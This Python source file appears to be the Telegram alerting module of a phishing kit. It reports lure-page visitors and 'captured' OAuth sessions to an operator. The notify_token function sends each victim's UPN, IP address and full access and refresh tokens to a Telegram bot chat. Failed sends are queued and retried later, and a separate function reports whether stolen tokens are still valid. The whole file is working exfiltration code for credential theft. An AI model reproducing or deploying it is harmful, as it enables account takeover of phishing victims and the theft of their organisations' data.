import json, threading, time
from pathlib import Path
import requests

from config import TELEGRAM_ENABLED, TELEGRAM_TOKEN, TELEGRAM_CHAT_ID

TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
QUEUE_PATH   = Path("/opt/phish/telegram_queue.jsonl")

QUEUE_MAX   = 500
QUEUE_TTL_S = 3600

_QUEUE_LOCK = threading.Lock()

def _code(s):
    if s is None: return "``"
    return "`" + str(s).replace("\\", "\\\\").replace("`", "'") + "`"

def _send(text: str) -> bool:
    if not TELEGRAM_ENABLED or not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    try:
        r = requests.post(
            f"{TELEGRAM_API}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": text,
                  "parse_mode": "MarkdownV2",
                  "disable_web_page_preview": "true"},
            timeout=10,
        )
        return r.ok
    except Exception:
        return False

def _queue(text: str):
    with _QUEUE_LOCK:
        lines = []
        if QUEUE_PATH.exists():
            try: lines = QUEUE_PATH.read_text().splitlines()
            except Exception: lines = []
        lines.append(json.dumps({"ts": int(time.time()), "text": text}))
        if len(lines) > QUEUE_MAX:
            lines = lines[-QUEUE_MAX:]
        try: QUEUE_PATH.write_text("\n".join(lines) + "\n")
        except Exception: pass

def _async(fn, *args, **kwargs):
    threading.Thread(target=fn, args=args, kwargs=kwargs, daemon=True).start()

def _deliver(text: str):
    if not _send(text):
        _queue(text)

def _deliver_many(*texts):
    for t in texts:
        _deliver(t)

def notify_token(user_code, upn, template, campaign, remote_ip,
                 access_token, refresh_token):
    header = (
        f"🎯 *New Token Captured*\n"
        f"\\- UPN: {_code(upn or '-')}\n"
        f"\\- Code: {_code(user_code)}\n"
        f"\\- Template: {_code(template)}\n"
        f"\\- Campaign: {_code(campaign or '-')}\n"
        f"\\- IP: {_code(remote_ip)}\n"
        f"\\- Time: {_code(time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime()))}"
    )
    access_msg  = f"🔑 *Access Token* \\({_code(user_code)}\\)\n{_code(access_token or '-')}"
    refresh_msg = f"🔁 *Refresh Token* \\({_code(user_code)}\\)\n{_code(refresh_token or '-')}"
    _async(_deliver_many, header, access_msg, refresh_msg)

def notify_visitor(user_code, template, campaign, remote_ip):
    text = (
        f"👀 *New Visitor*\n"
        f"\\- Code: {_code(user_code)}\n"
        f"\\- Template: {_code(template)}\n"
        f"\\- Campaign: {_code(campaign or '-')}\n"
        f"\\- IP: {_code(remote_ip)}"
    )
    _async(_deliver, text)

def notify_validation(user_code, upn, status):
    emoji = {"valid": "✅", "revoked": "❌", "expired": "⏰"}.get(status, "❔")
    text = (
        f"{emoji} *Token Validation*\n"
        f"\\- UPN: {_code(upn)}\n"
        f"\\- Code: {_code(user_code)}\n"
        f"\\- Status: {_code(status)}"
    )
    _async(_deliver, text)

def notify_error(message):
    _async(_deliver, f"⚠️ *Error*\n{_code(message)}")

def flush_queue():
    if not QUEUE_PATH.exists(): return
    with _QUEUE_LOCK:
        try:
            lines = QUEUE_PATH.read_text().splitlines()
            QUEUE_PATH.write_text("")
        except Exception:
            return
    now = time.time()
    for line in lines:
        try: rec = json.loads(line)
        except Exception: continue
        if now - rec.get("ts", 0) > QUEUE_TTL_S:
            continue
        _deliver(rec.get("text", ""))